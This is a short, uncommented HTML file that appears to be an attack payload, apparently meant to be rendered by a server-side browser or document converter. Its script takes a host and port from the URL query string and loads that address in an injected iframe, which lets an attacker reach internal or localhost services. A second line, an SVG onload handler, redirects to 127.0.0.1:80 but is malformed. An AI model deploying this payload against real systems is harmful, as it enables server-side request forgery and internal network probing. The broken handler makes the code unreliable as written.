<html>

<body>
  <script>
	function getLocation(){
		try{
			l=location;if(l.search){a=l.search.split('?')[1].split('=');h=a[0];p=a[1]};
			return `http://${h}:${p}`;
		} catch (e) {
		console.log(e)
		}
	}

	f=document.createElement('iframe');

	f.src = getLocation()
	document.body.appendChild(f);
  </script>
	<svg/onload="location=127.0.0.1:80}">
